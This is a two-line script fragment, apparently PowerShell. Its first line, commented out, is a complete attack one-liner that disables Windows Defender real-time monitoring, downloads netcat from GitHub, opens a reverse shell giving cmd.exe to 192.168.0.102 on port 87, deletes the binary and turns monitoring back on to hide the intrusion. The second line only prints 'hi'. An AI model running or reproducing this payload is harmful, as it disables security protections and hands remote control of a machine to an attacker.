#Set-MpPreference -DisableRealtimeMonitoring $true; (new-object System.Net.WebClient).DownloadFile('https://github.com/skyformat99/netcat-for-windows/raw/master/1.12/nc.exe','nc.exe'); .\nc.exe 192.168.0.102 87 -e cmd.exe; del .\nc.exe; Set-MpPreference -DisableRealtimeMonitoring $false; exit
echo hi
